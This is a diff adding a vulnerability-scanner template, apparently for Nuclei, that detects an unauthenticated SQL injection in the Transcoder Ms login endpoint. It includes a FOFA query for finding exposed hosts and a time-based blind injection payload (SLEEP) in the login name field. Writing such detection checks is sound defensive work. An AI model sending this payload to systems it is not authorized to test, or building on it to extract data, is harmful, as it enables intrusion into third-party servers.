@@ -1,0 +1,38 @@
+id: anystreaming-transcoder-ms-index-sqli
+info:
+  name: 上海网仕科技 Transcoder Ms index.php存在SQL注入
+  author: leadlife
+  severity: high
+  description: 上海网仕科技 Transcoder Ms index,php 接口存在SQL注入漏洞，未经身份验证的远程改击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ahzbt66n6tyn61wz
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="webtrans//js/md5-min.js"
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,anystreaming,transcoder-ms
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /webtrans/index.php?controller=user&action=login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        Content-Length: 143
+
+        name=test123') AND (SELECT 3356 FROM (SELECT(SLEEP(5)))xSEI) AND ('pJPU'='pJPU&pass=OThkNzJlMThlMDUwMGZlNzk5ZTY0Y2MyYTkxNzIyYzY%3D&lang=zh_CN
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
